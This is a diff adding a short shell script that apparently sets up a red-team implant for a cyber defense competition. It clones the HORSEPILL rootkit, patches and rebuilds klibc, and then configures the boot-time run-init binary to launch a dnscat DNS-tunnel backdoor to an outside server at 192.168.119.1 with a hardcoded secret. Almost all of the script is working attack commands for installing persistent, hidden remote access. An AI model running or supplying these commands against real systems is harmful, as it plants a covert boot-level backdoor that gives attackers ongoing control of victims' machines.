@@ -1,0 +1,13 @@
+https://github.com/r00tkillah/HORSEPILL
+
+git clone https://github.com/r00tkillah/HORSEPILL.git /HORSEPILL
+##
+cp /etc/apt/sources.list /etc/apt/sources.list~
+sed -Ei 's/^# deb-src /deb-src /' /etc/apt/sources.list
+apt-get update
+apt-get install -y git vim quilt python
+apt-get build-dep -y klibc && apt-get source -y klibc
+klibcver=$(find / -maxdepth 1 -name 'klibc-*' | awk -F 'klibc-' '{print $2}')
+if [ $klibcver != "2.0.4" ]; then sed -i 's/klibc-2.0.4/klibc-'$klibcver'/' /HORSEPILL/klibc-horsepill.patch; fi
+cd /klibc-$klibcver; quilt import /HORSEPILL/klibc-$klibcver-horsepill.patch && dpkg-buildpackage -j$(nproc) -us -uc
+/HORSEPILL/horsepill_setopt /klibc-$klibcver/usr/kinit/run-init/shared/run-init dsncat --secret=password123 --server=192.168.119.1,port=53 redteam.seccdc
